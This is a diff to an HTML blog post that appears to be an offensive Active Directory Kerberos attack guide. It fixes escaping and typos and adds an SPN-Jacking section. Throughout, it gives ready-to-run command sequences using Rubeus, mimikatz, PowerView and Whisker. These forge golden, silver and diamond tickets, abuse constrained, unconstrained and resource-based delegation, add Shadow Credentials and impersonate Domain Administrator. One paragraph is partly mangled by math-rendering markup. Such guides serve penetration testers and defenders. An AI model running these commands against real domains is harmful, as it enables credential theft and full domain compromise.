@@ -422,7 +422,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
    Rubeus.exe dump /luid:&lt;luid&gt; /service:krbtgt /nowrap
 
 3. # And now pass it into Rubeus' createnetonly command to create a new cmd with the ticket imported in it
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:&lt;user dumped&gt; /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;TGT ticket&gt; /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:&lt;user dumped&gt; /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;TGT ticket&gt; /show
 
 4. # Now you can run klist in this command prompt to see your import tickets
    klist
@@ -451,7 +451,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
 <p>If this flag is set on a machine account and a user makes a TGS request to access this service, the TGS will add a copy of the user’s TGT into the Service Ticket. This way, the machine account can extract this TGT copy, cache it in memory, and use it to make TGS requests to the DC as that user and obtain Service Tickets to other services, like the database in our example. So, if we compromise a machine account with unconstrained delegation, we can steal the TGTs of users from when they authenticated and impersonate them. If unconstrained delegation is not enabled, only the Service Ticket will be stored in memory.</p>
 <p><strong>Abusing Unconstrained Computers:</strong></p>
 <pre><code>1. # Enumerate for computers with unconstrained delegation.
-   Import-Module .\\PowerView.ps1
+   Import-Module .\PowerView.ps1
    Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" | select samaccountname,dnshostname
 
 2. # After obtaining Administrator/SYSTEM on this machine, we can start Rubeus in monitor mode to list current TGTs in memory,
@@ -466,7 +466,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
      # Copy TGT and paste below
      Rubeus.exe s4u /user:dc$ /ticket:&lt;base64_TGT_ticket_for_DC&gt; /impersonateuser:Administrator /altservice:cifs/dc.testlab.com /self /nowrap
      # Now from here, use the Service Ticket to perform PtT with createnetonly
-     Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;new_ticket&gt; /show
+     Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;new_ticket&gt; /show
 
    Option B: # Sit and wait for a user to connect to the machine and steal their TGT.
      # User (hopefully Domain Admin) connects to machine
@@ -515,7 +515,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
 </code></pre>
 <p><strong>Abuse in Windows:</strong></p>
 <pre><code>1. # Enumerate accounts with constrained delegation
-   Import-Module .\\PowerView.ps1
+   Import-Module .\PowerView.ps1
    Get-DomainComputer -TrustedToAuth | select dnshostname,samaccountname,msds-allowedtodelegateto,useraccountcontrol
 
 2. # After compromising the computer, we can list krbtgt tickets on the machine (TGT tickets).
@@ -530,7 +530,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
    # We can also use /altservice:&lt;service&gt; to access different services on this computer
 
 5. # Now take the obtained service ticket and pass it into createnetonly
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;Base64 service ticket&gt; /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;Base64 service ticket&gt; /show
 
 5. # Run klist to view the current ticket in your cache
    klist
@@ -553,7 +553,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
    Import-Module PowerView.ps1
 
    # First, let's enumerate the domain and identify computers that have security principals with privileged access over them. Our goal is to obtain access of the privileged account to write into the msDS-AllowedToActOnBehalfOfOtherIdentity property.
-   Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "&lt;Domain Sid&gt;-[\\\\d]{4,10}" } | select @{Name="Computer";Expression={ConvertFrom-SID $_.ObjectSID}},objectdn,activedirectoryrights,objectacetype,@{Name="Privileged Principal";Expression={ConvertFrom-SID $_.SecurityIdentifier}} | fl
+   Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "&lt;Domain Sid&gt;-[\d]{4,10}" } | select @{Name="Computer";Expression={ConvertFrom-SID $_.ObjectSID}},objectdn,activedirectoryrights,objectacetype,@{Name="Privileged Principal";Expression={ConvertFrom-SID $_.SecurityIdentifier}} | fl
 
 2. # Next, let’s check the target to see if the target computer’s (dc) attribute is empty or not.
    # We can later see if the amount increased after our attack to confirm if it was successful.
@@ -573,7 +573,7 @@ Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /now
 
 7. # After retrieving the service ticket for the Administrator user for the cifs service on dc, we can import it with createnetonly.
    # We can now access cifs on dc as the DA user nlamb.
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
 
 # To clean up, simply remove the msDS-AllowedToActOnBehalfOfOtherIdentity entry on the target: dc
 powerpick Get-DomainComputer -Identity dc | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
@@ -635,7 +635,7 @@ Ticket combinations from Zero-Point Security</p>
    Rubeus.exe silver /service:cifs/wkstn.testlab.com /aes256:&lt;wkstn-aes256-key&gt; /user:Administrator /domain:testlab.com /sid:&lt;domain sid&gt; /nowrap
 
 3. # Take the base64 Service Ticket from step 2 and pass it into createnetonly
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
 </code></pre>
 <br>
 <h3 id="golden-ticket">Golden Ticket</h3>
@@ -675,12 +675,12 @@ Ticket combinations from Zero-Point Security</p>
 3. # Lastly, we can create a golden ticket using Rubeus
    Rubeus.exe golden /domain:testlab.com /user:Administrator /sid:&lt;domain sid&gt; /aes256:&lt;aes256 key of krbtgt&gt; /nowrap
    # Take the base64 golden ticket (TGT) and pass into createnetonly
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;base64 golden ticket&gt; /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;base64 golden ticket&gt; /show
    # Note: You can also run Rubeus' golden command on your Windows attack box, and then copy the base64 ticket to use it later
 </code></pre>
 <br>
 <h3 id="diamond-ticket">Diamond Ticket</h3>
-<p>Diamond tickets are an “upgrade” from the golden tickets because it is more opsec friendly. A diamond ticket is made by requesting a legitimate TGT that was issued by a DC, decrypting it, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the shortcoming of a golden ticket beecause any TGS-REQs will have a preceding AS-REQ.</p>
+<p>Diamond tickets are an “upgrade” from the golden tickets because it is more opsec friendly. A diamond ticket is made by requesting a legitimate TGT that was issued by a DC, decrypting it, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.</p>
 <p><strong>Abuse in Windows</strong></p>
 <pre><code>1. # First, lets dump the kerberos aes256 key for the krbtgt service account
    mimikatz.exe
@@ -690,7 +690,7 @@ Ticket combinations from Zero-Point Security</p>
    Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:&lt;krbtgt aes256 key&gt; /nowrap
 
 3. # Now take the base64 TGT diamond ticket and pass it into createnetonly
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;TGT ticket&gt; /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;TGT ticket&gt; /show
 </code></pre>
 <br>
 <h2 id="additional-kerberos-attacks">Additional Kerberos Attacks</h2>
@@ -702,7 +702,7 @@ Ticket combinations from Zero-Point Security</p>
 <li><strong>Initial Setup:</strong> Two users are involved: the “client” user and the “server” user.The client-user wants to access a service on the server-user’s desktop machine.</li>
 <li><strong>TGT Exchange:</strong> At the start, the client-user requests the server-user’s Ticket-Granting Ticket (TGT) from the server-user.</li>
 <li><strong>Client Request to KDC:</strong> The client-user then sends a request to the KDC for a service ticket to access the server-user’s service by making the <code>sname</code> field refer to a user instead of a service with a SPN.This request includes the server-user’s TGT in the <code>additional-tickets</code> field as an additional ticket and sets the <code>ENC-TKT-IN-SKEY</code> flag to True.</li>
-<li><strong>KDC Response:</strong> Since the <code>ENC-TKT-IN-SKEY</code>option has been specified and an additional ticket is included in the request, the KDC will decrypt the additional ticket using the session key for the server to which the additional-ticket TGT was issued for, and then it will verify that it is a valid TGT.If successful, the KDC issues a service ticket encrypted with the session key from the additional TGT (instead of normally being the service’s pass hash). This ticket is sent back to the client-user.</li>
+<li><strong>KDC Response:</strong> Since the <code>ENC-TKT-IN-SKEY</code> option has been specified and an additional ticket is included in the request, the KDC will decrypt the additional ticket using the session key for the server to which the additional-ticket TGT was issued for, and then it will verify that it is a valid TGT.If successful, the KDC issues a service ticket encrypted with the session key from the additional TGT (instead of normally being the service’s pass hash). This ticket is sent back to the client-user.</li>
 <li><strong>Service Access:</strong> When the client-user wants to access the server-user’s service, they present the service ticket.The server-user uses their short-lived session key (from the TGT) to decrypt the ticket and verify the client-user’s credentials.</li>
 </ol>
 <p>The advantage of U2U is that the server-user does not need to store a long-term key on their desktop, reducing the risk of key theft.</p>
@@ -736,7 +736,7 @@ Ticket combinations from Zero-Point Security</p>
 <p><img src="https://cdn-images-1.medium.com/max/716/1*6AiaMXfG6QEJo4QIYKor8A.png" alt=""></p>
 <p>However Arseniy also shows that the “NT-ENTERPRISE” Name Type is much more valuable because it supports multiple name formats.</p>
 <p><img src="https://cdn-images-1.medium.com/max/716/1*CdACkoUa2Vgh6k9onZh4bw.png" alt=""></p>
-<p>Picture is from <a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">this blog by Arseniy</a></p>
+<p>Picture is from <a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/">this blog by Arseniy</a></p>
 <p>All we have to do is just specify the “NT-ENTERPRISE” Name Type in the field to Kerberoast a user using a samaccountname which was implemented in Rubeus and Impacket, and is why they support supplying username wordlists, as explained in the blog.</p>
 <p><strong>Kerberoasting without Pre-Authentication</strong></p>
 <p>This is a concept where we can request Service Tickets from the AS instead of from the TGS. Typically we send an AS-REQ to the AS with the sname field containing the krbtgt account which results in a TGT. And if pre-auth isn’t required (AS-REP Roasting) then we don’t have to suply credentials to obtain the TGT. If there is a user with no pre-auth required, then we can actually just change the sname in a normal AS-REQ from the krbtgt service account SPN, to any other service account’s SPN. And if we choose NT-ENTERPRISE as the Name Type, then we can just supply a samaccountname as the sname value instead of a full SPN. This basically means we can use a username wordlist to Kerberoast using an AS-REP Roastable account even if we don’t know the account’s credentials.</p>
@@ -766,6 +766,39 @@ Ticket combinations from Zero-Point Security</p>
 </code></pre>
 <br>
 <h3 id="spn-jacking">SPN-Jacking</h3>
+<p>SPN-Jacking is a type of attack that combines Kerberos Constrained Delegation and Discretionary Access Control List (DACL) abuse. When performing a Constrained Delegation attack, you can only access the machine that is in the msDS-AllowedToDelegateTo attribute, and because of the double hop problem, when you get on that machine as let’s say a Domain Admin, you will not be able to access the Domain Controller.</p>
+<p>As discussed in the delegation sections, SeEnableDelegation privileges are required to change the constrained delegation configuration which is only given to Domain &amp; Enterprise Admins, but to change SPNs you only need a write primitive like GenericAll or GenericWrite</p>
+<p>SPN-Jacking is where we “change” the devices we can access with constrained delegation by identifying the SPNs in the msDS-AllowedToDelegate attribute and abusing a write primitive like GenericAll or GenericWrite on another machine to add the SPN to the machine so that we can perform constrained delegation to it. This effectively lets us perform constrained delegation attacks on different machines than originally.</p>
+<p>There are basically 2 versions of this attack. “Live SPN-Jacking” and “Ghost SPN-Jacking”.</p>
+<p><strong>Live SPN-Jacking</strong></p>
+<p>This is where we move an SPN from a machine to another machine. We can imagine a scenario where MachineA (which we control) has constrained delegation to the SPN cifs/MachineB which the MachineB$ account currently has in its SPN attribute, and the goal is to compromise the MachineC$ account. If we have write permissions over MachineB$ and MachineC<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo><mi>w</mi><mi>e</mi><mi>c</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>r</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>S</mi><mi>P</mi><mi>N</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>b</mi><mi>u</mi><mi>t</mi><mi>e</mi><mi>o</mi><mi>n</mi><mi>M</mi><mi>a</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>n</mi><mi>e</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">, we can clear the SPN attribute on MachineB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.88888em; vertical-align: -0.19444em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span style="margin-right: 0.02691em;" class="mord mathnormal">w</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">an</span><span class="mord mathnormal">c</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span style="margin-right: 0.10903em;" class="mord mathnormal">SPN</span><span class="mord mathnormal">a</span><span class="mord mathnormal">tt</span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span><span class="mord mathnormal">ib</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">eo</span><span class="mord mathnormal">n</span><span style="margin-right: 0.10903em;" class="mord mathnormal">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">hin</span><span class="mord mathnormal">e</span><span style="margin-right: 0.05017em;" class="mord mathnormal">B</span></span></span></span></span> to remove the cifs/MachineB SPN, and then add this SPN to the MachineC$ account. This effectively lets us perform constrained delegation over MachineC$ now, because it has the cifs/MachineB SPN in its SPN attribute.</p>
+<p><strong>Ghost SPN-Jacking</strong></p>
+<p>In this scenario, we can say MachineA (which we control) has constrained delegation to the SPN cifs/MachineD, however this SPN doesn’t actually exist on any machine’s SPN attribute, basically a “ghost”. If we had write permissions over the Workstation$ account, we can just add the cifs/MachineD attribute to the Workstation$ object and then perform constrained delegation attacks. This means we only needed write permissions over 1 object, because although the configuration existed on MachineA for cifs/MachineD, it didn’t exist anywhere, and so we don’t have to remove it from anywhere. We just have to write it to another object and then perform our constrained delegation attack.</p>
+<p><strong>Abuse in Windows:</strong></p>
+<pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Show the SPNs listed in the constrained delegation attribute</span>
+   Get-DomainObject -Identity MachineA$ -Properties <span class="token string">'msDS-AllowedToDelegateTo'</span>
+
+2. <span class="token comment"># As the privileged user, check the current SPN (remember for later) then remove the SPN from MachineB if required (live SPN-jacking)</span>
+   Get-DomainObject -Identity MachineB$ -Properties ServicePrincipalName <span class="token comment"># SAVE THIS TO RESTORE IT</span>
+   Set-DomainObject -Identity MachineB$ -Clear ServicePrincipalName <span class="token comment"># THIS WILL CLEAR IT</span>
+
+3. <span class="token comment"># add SPN to MachineC</span>
+   Set-DomainObject -Identity MachineC$ -Set @<span class="token punctuation">{</span>ServicePrincipalName<span class="token operator">=</span><span class="token string">'cifs/MachineB'</span><span class="token punctuation">}</span>
+
+4. <span class="token comment"># If the account with constrained delegation is a computer, we can dump the machine's TGT</span>
+   <span class="token comment"># Note if the principal was a user, you can skip this step and do /pass:&lt;pass&gt; instead of /ticket:&lt;ticket&gt; for the next step</span>
+   Rubeus.exe triage /service:krbtgt
+   Rubeus.exe dump /luid:<span class="token operator">&lt;</span>luid<span class="token operator">&gt;</span> /service:krbtgt
+
+5. <span class="token comment"># request an impersonating service ticket for the SPN through S4U2self + S4U2proxy</span>
+   Rubeus.exe s4u /msdsspn:cifs/MachineB /impersonateuser:Administrator /domain:testlab.com /user:MachineA$ /ticket:<span class="token operator">&lt;</span>MachineA TGT<span class="token operator">&gt;</span> /nowrap 
+
+5. <span class="token comment"># Edit the ticket's SPN (service class and/or hostname)</span>
+   Rubeus.exe tgssub /ticket:<span class="token operator">&lt;</span>Base64 <span class="token function">service</span> ticket<span class="token operator">&gt;</span> /altservice:cifs/MachineC /nowrap
+
+6. <span class="token comment"># Now pass into createnetonly</span>
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:Administrator /password:randompasshere /domain:testlab.com /ticket:<span class="token operator">&lt;</span>modified ticket<span class="token operator">&gt;</span> /show
+</code></pre>
 <br>
 <h3 id="shadow-credentials">Shadow Credentials</h3>
 <p>Shadow Credentials is an attack that abuses DACL permissions to add “Key Credentials” to the target object to then perform Kerberos authentication using PKINIT and gain access as that user.</p>
@@ -805,11 +838,11 @@ Ticket combinations from Zero-Point Security</p>
 		  
    b. <span class="token comment"># Identify users/groups/machines with write access over the msds-key-credential-link attribute on a computer.</span>
       <span class="token comment"># Make sure to put in your domain and domain SID!</span>
-      Get-DomainComputer -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
+      Get-DomainComputer -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
 		  
    c. <span class="token comment"># Now identify users/groups/machines with write access over the msds-key-credential-link attribute on a user.</span>
       <span class="token comment"># Again, make sure to put in your domain and domain SID!</span>
-      Get-DomainUser -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
+      Get-DomainUser -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
 
 2. <span class="token comment"># Compromise the privileged account from step 1. After that, list keys that may be present on the target to keep track of this for later when clearing.</span>
    Whisker.exe list /target:dc$
@@ -824,11 +857,11 @@ Ticket combinations from Zero-Point Security</p>
    Rubeus.exe s4u /user:dc$ /ticket:<span class="token operator">&lt;</span>base64 TGT<span class="token operator">&gt;</span> /impersonateuser:Administrator /altservice:cifs/dc.testlab.com /self /nowrap
 	 
 6. <span class="token comment"># Now pass into createnetonly</span>
-   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:randompass /ticket:<span class="token operator">&lt;</span>base64 <span class="token function">service</span> ticket<span class="token operator">&gt;</span> /show
+   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:TESTLAB /username:Administrator /password:randompass /ticket:<span class="token operator">&lt;</span>base64 <span class="token function">service</span> ticket<span class="token operator">&gt;</span> /show
 </code></pre>
 <br>
 <h3 id="unpac-the-hash">UnPAC the Hash</h3>
-<p>Let’s add on to what we learned from the Shadow Credentials attack, if a TGT was obtained with PKINIT, and you use it to request a service ticket, the service ticket will contain the NTLM hash of the user/computer that the TGT belongs to, inside the PAC in the PAC_CREDENTIAL_INFO field. And just like normal, the ticket is encrypted using the key of the service it is issued for. This was implemented for compatibility in the event the user/computer needs to access resources that require NTLM authentication.</p>
+<p>Let’s add on to what we learned from the Shadow Credentials attack, if a TGT was obtained with PKINIT, and you use it to request a service ticket, the service ticket will contain the NTLM hash of the user/computer that the TGT belongs to, inside the PAC in the <code>PAC_CREDENTIAL_INFO</code> field. And just like normal, the ticket is encrypted using the key of the service it is issued for. This was implemented for compatibility in the event the user/computer needs to access resources that require NTLM authentication.</p>
 <p>Typically we shouldn’t be able to decrypt a service ticket because it will be encrypted with the service’s password hash. Except if we perform U2U + S4U2Self, we will be able to decrypt the service ticket because it is for ourself (remember a U2U service ticket is encrypted with the session key associated with the TGT which we got from the AS-REP), and then we can decrypt the service ticket using the obtained session key to read the PAC and obtain the user/computer’s NTLM hash.</p>
 <p>This is the UnPAC the Hash attack.</p>
 <p><strong>Abuse in Linux:</strong></p>
@@ -877,6 +910,7 @@ Ticket combinations from Zero-Point Security</p>
 <ul>
 <li><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61">https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61</a></li>
 <li><a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">https://www.semperis.com/blog/new-attack-paths-as-requested-sts/</a></li>
+<li><a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/">https://swarm.ptsecurity.com/kerberoasting-without-spns/</a></li>
 </ul>
 <p>Shadow Credentials</p>
 <ul>
